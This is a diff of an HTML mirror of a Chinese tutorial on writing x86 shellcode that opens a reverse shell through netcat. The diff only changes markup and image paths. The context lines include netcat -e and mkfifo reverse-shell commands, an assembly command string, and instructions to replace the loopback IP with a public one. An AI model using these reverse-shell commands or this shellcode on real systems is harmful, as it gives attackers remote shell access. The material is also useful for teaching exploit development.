@@ -3,18 +3,18 @@
 			<head>
 			     <title>使用netcat进行反弹链接的shellcode - ∑-TEAM</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/1376">http://drops.wooyun.org/tips/1376</a></h1>
 				
       <p>
-        <p>from:<a href="http://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat/">http://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat/</a></p>
+        </p><p>from:<a href="http://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat/">http://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat/</a></p>
 
 <p>这篇文章主要是谈，在远程溢出时怎样构造shellcode，才能形成一个有效的反弹链接。</p>
 
 <h2>0x00 反向绑定远程shell</h2>
 
-<hr />
+<hr>
 
 <p>让本地主机和远程shell建立起连接的方法有很多种，其中最常见的是在远程主机上开放一个端口，然后把它的</p>
 
@@ -35,7 +35,7 @@
 
 <h2>0x01 netcat -e命令</h2>
 
-<hr />
+<hr>
 
 <p>首先我们假设，目标网站上安装了netcat。</p>
 
@@ -57,7 +57,7 @@ netcat -lvp 9999
 netcat -e /bin/sh 127.0.0.1 9999  
 </code></pre>
 
-<p>这样，你的第一个shell将建立起一个链接，在其中执行<code>ls whoami</code> 等命令，测试一下它是否可以正常工作，<br />
+<p>这样，你的第一个shell将建立起一个链接，在其中执行<code>ls whoami</code> 等命令，测试一下它是否可以正常工作，<br>
 你也可以使用 Ctrl+c 来关闭这个链接。</p>
 
 <p>注意:openbsd版本的netcat不支持 -e或者-c 参数。</p>
@@ -72,7 +72,7 @@ rm -f /tmp/f; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l 127.0.
 
 <h2>0x02 汇编代码</h2>
 
-<hr />
+<hr>
 
 <p>现在我们就来看一下怎样把这条语句通过汇编执行，并放入shellcode中。</p>
 
@@ -122,7 +122,7 @@ execve(command[0], command, NULL);
 /bin/netcat#-e#/bin/sh#127.127.127.127#9999#AAAABBBBCCCCDDDDEEEEFFFF
 </code></pre>
 
-<p>字符串中各个部分被<code>#</code>隔开，是因为在shellcode中不能出现null，这会造成shellcode被截断，从而不能被<br />
+<p>字符串中各个部分被<code>#</code>隔开，是因为在shellcode中不能出现null，这会造成shellcode被截断，从而不能被<br>
 目标主机正确运行。</p>
 
 <p>不管我们在哪里运行这段程序，首先需要知道的是命令字符串的地址。</p>
@@ -137,7 +137,7 @@ mov eax,0
 
 <p>因为null在shellcode中是不允许出现的。最后我们吧，命令字符串分开存放到内存之中。</p>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811003259310.png" alt="1396093148.png" /></p>
+<p><img src="../images_result/images/2014091811003259310.png" alt="1396093148.png"></p>
 
 <p>在第5行到第9行，我们把寄存器中的0移动到字符串的末尾，使用替代<code>#</code>（取自eax寄存器，其中的0使用xor生成）之后我们需要一个各个字符串地址的数组，作为execve()的第二个参数。</p>
 
@@ -145,12 +145,12 @@ mov eax,0
 
 <p>在第20行我们准备执行系统调用，我们首先把0xb存储到eax中，esi(/bin/netcat的地址)存储到ebx中，字符串的地址存储到，ecx中，最后edx存储null，之后使用0x80触发系统调用，不出意外的话，一个反弹链接的指令就成功执行了。</p>
 
-<p>这个例子中，ip地址使用的是127.127.127.127  端口号是 9999，这是一个本地的ip地址。通常情况下<br />
+<p>这个例子中，ip地址使用的是127.127.127.127  端口号是 9999，这是一个本地的ip地址。通常情况下<br>
 你需要使用一个外网IP来替换掉它，如果两个ip长度不同的话，你要仔细的修改掉所有与他相关联的汇编代码。</p>
 
 <h2>0x03 编译测试shellcode</h2>
 
-<hr />
+<hr>
 
 <p>现在，需要把汇编代码存储到一个asm文件之中，我们这里叫做shell.asm,使用以下的语句编译它，</p>
 
@@ -158,7 +158,7 @@ mov eax,0
 nasm -felf32 -o shell.o shell.asm
 </code></pre>
 
-<p>使用，<code>objdump -D</code>命令我们就可以看到这个小程序的opcodes,使用下面一段指令我们就可以把它们<br />
+<p>使用，<code>objdump -D</code>命令我们就可以看到这个小程序的opcodes,使用下面一段指令我们就可以把它们<br>
 放入到一个C字符串中</p>
 
 <pre><code>#!bash
@@ -190,9 +190,9 @@ gcc shellcode.c -fno-stack-protector -z execstack -o shellcode
 
 <p>在另一个shell中运行<code>netcat -lvp 9999</code>，然后运行这个c程序<code>./shellcode</code>如果一切正确的话你就可以得到一个反弹链接的shell了。</p>
 
-<p><img src="http://static.wooyun.org/20140918/2014091811003627172.png" alt="1396096315.png" /></p>
+<p><img src="../images_result/images/2014091811003627172.png" alt="1396096315.png"></p>
 
-<p>happy hacking!</p>      </p>
+<p>happy hacking!</p>      <p></p>
     
 			</body>
 		</html>
